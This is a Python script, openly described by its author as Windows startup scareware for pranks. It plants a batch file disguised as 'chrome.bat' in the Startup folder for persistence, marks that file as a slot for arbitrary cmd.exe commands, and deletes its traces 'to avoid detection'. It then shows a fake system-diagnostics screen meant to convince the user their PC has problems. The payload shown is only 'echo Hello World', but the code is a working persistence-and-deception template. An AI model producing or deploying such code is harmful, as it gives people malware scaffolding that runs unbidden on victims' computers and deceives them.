
# Pyirusv2.0
# Copyright (C) 2018-2019 M.Anish <aneesh25861@gmail.com>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

'''PYIRUS A Simple Python Startup Scareware for windows developed by M.Anish '''

# This is python3 version of Cstorm.
# This Python Script is for Simple Pranks only. Use it at your own risk.
# The developer should not be held responsible under any case.

import os

#Function to get Current User in Windows who is logged in.
def tunnel():
        os.system('echo %USERPROFILE%>user')
        
#Function to place chrome.bat in startup folder in windows.        
def tscan():
       if os.path.exists('user'):
       
       #Try to detect if enough permissions are available or not. Attempt without admin access warn user if admin access required.
        with open('user','r') as f:
                s=f.read().strip()
                s=s+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
                if os.path.exists(s):
                 with open(s+'\chrome.bat','w') as i:
                         i.write('\necho Hello World\npause')         #String with  commands to be executed by cmd.exe
                else:
                    try:
                       s='C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
                       if os.path.exists(s):
                          with open(s+'\chrome.bat','w') as i:
                              i.write('\necho Hello World\npause')    #String with  commands to be executed by cmd.exe
                    except PermissionError:
                               lol=os.getcwd()
                               with open('run.bat','w') as p:
                                  p.write('py '+lol+'\pyirus.py \npause')
                               print('\nPlease run run.bat program as administrator!\n')
                               x=input()
                               exit()
       else:
            exit(0)

#Perform some cleaning to avoid detection.
def ok():
       if os.path.exists('user'):
           os.remove('user')

#Load all reqired functions.
def run():
        tunnel()
        tscan()
 
#Display contents of text file. 
def display(file):
        with open(file,'r') as f:
            s=f.read(1024)
            print(s)
            while len(s)>0:
                s=f.read(1024)
                print(s)
                
#Function to pause program until user input.                
def pause():
        q=input('\nPress any key to continue...\n')
        
def main():
  run()
  ok()
  
  #Try a bit of social engineering to convince user something is wrong in their PC.
  print(' \n |----- System Diagonists -----| ')
  print('\n Checking PC for problems...')
  os.system('systeminfo>getlog')
  display('getlog')
  os.remove('getlog')
  pause()
  
main()
 
